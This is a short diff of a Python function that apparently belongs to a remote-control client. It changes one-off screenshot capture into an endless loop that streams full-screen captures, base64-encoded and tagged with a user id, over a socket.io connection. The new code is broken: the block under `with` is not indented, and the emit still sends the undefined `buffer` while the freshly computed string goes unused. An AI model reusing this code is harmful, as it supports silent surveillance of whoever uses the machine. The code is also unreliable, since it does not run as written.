@@ -8,8 +8,8 @@ import base64
 import ssl
 from urllib.request import urlopen
 import importlib.util
-import cv2
-import dxcam
+import mss
+import io
 
 def run(data):
 
@@ -135,11 +135,19 @@ def run(data):
 
 
     def take_screenshots(sio, uid):
-        camera = dxcam.create()
-        screenshot = camera.grab()
+        while True:
+            with mss.mss() as sct:
+            # Capture the entire screen
+            monitor = sct.monitors[0]
+            screenshot = sct.grab(monitor)
 
-        _, buffer = cv2.imencode('.png', screenshot)
-        sio.emit("screenshot", {"uid": uid, "image": base64.b64encode(buffer).decode('utf-8')})
+            # Convert to PNG
+            png = mss.tools.to_png(screenshot.rgb, screenshot.size)
+
+            # Encode as base64
+            base64_string = base64.b64encode(png).decode('utf-8')
+
+            sio.emit("screenshot", {"uid": uid, "image": base64.b64encode(buffer).decode('utf-8')})
 
 
 
